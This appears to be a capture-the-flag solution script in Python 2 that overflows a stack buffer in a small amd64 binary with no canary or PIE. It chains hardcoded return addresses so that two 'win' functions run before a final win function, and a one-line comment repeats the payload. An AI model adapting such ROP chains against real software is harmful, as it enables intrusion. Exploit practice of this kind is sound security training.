#!/usr/bin/env python

#   Arch:     amd64-64-little
#   RELRO:    Partial RELRO
#   Stack:    No canary found
#   NX:       NX enabled
    #PIE:     No PIE (0x400000)

Offset =  "A"*64


rbp_address =  "IIIIIIII" 


rop  = "\xbd\x07\x40\x00\x00\x00\x00\x00" # win_fn2 ret fun ( pop %rbp)  (|0x00000000004007bd <+60> ret) 


win_1  = "\x77\x07\x40\x00\x00\x00\x00\x00" # win_fn1 ( 0x0000000000400777 <+16>:	mov  BYTE PTR [rip+0x2008fb],0x1   # 0x601079 <win1>)


Add = "CCCCCCCC" # ( pop %rbp)

win_2 = "\xb4\x07\x40\x00\x00\x00\x00\x00" # win_fn2  (0x00000000004007b4 <+51>:	mov BYTE PTR [rip+0x2008bf],0x1   # 0x60107a <win2>)


ADD_1 = "BBBBBBBB" #( pop %rbp)

win_fn = "\xbe\x07\x40\x00\x00\x00\x00\x00"# win_fn call address (0x00000000004007be <+0> push   rbp)


execute = Offset + rbp_address  + rop + win_1 + Add + win_2 + ADD_1 + win_fn  

print execute

#python -c 'print( "A"*64 + "IIIIIIII" + "\xbd\x07\x40\x00\x00\x00\x00\x00"+ "\x77\x07\x40\x00\x00\x00\x00\x00" + "CCCCCCCC" + "\xb4\x07\x40\x00\x00\x00\x00\x00" +  "BBBBBBBB" + "\xbe\x07\x40\x00\x00\x00\x00\x00")'
